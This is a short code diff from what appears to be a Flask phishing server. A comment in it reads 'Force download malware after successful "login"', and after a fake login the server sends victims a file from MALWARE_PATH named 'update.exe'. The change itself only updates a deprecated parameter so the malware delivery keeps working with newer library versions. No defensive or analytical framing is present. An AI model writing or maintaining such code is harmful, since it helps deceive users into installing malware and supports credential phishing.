@@ -36,7 +36,7 @@ def login():
         print(f"SMS Error: {e}")
 
     # Force download malware after successful "login"
-    return send_file(MALWARE_PATH, as_attachment=True, attachment_filename='update.exe')
+    return send_file(MALWARE_PATH, as_attachment=True, download_name='update.exe')
 
 if __name__ == '__main__':
     app.run(debug=False, port=5000, host='0.0.0.0')
